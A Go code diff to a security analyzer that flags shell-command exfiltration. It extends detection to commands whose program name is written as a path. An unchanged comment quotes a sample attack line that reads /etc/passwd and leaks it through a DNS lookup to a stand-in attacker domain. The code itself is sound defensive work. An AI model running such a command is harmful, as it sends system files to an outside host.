@@ -48,9 +48,31 @@ func (d *DataflowAnalyzer) Analyze(ctx *AnalysisContext) []Finding {
 	// Check command substitution exfiltration (e.g., dig $(cat /etc/passwd).evil.com)
 	findings = append(findings, d.checkSubstitutionExfil(ctx)...)
 
+	// A command word spelled as a path (#3991): the source/sink/encoder
+	// recognisers key on program names, so re-run them against the
+	// program-name view and keep new RESTRICTING findings. The view's
+	// DataFlows are discarded — the record describes what was written.
+	pv := ctx.restrictView()
+	if pv != nil {
+		have := map[string]bool{}
+		for _, f := range findings {
+			have[f.RuleID] = true
+		}
+		view := *ctx
+		view.Parsed = pv
+		view.DataFlows = nil
+		for _, f := range append(append(d.checkRedirectFlows(&view), d.checkPipeFlows(&view)...), d.checkSubstitutionExfil(&view)...) {
+			if restrictingDecision(f.Decision) && !have[f.RuleID] {
+				have[f.RuleID] = true
+				findings = append(findings, f)
+			}
+		}
+	}
+
 	// 2. Run user-defined YAML dataflow rules
 	for _, rule := range d.userRules {
-		if MatchDataflowRule(ctx.Parsed, rule) {
+		if MatchDataflowRule(ctx.Parsed, rule) ||
+			(pv != nil && restrictingDecision(rule.Decision) && !rule.Negate && MatchDataflowRule(pv, rule)) {
 			f := Finding{
 				AnalyzerName: "dataflow",
 				RuleID:       rule.ID,
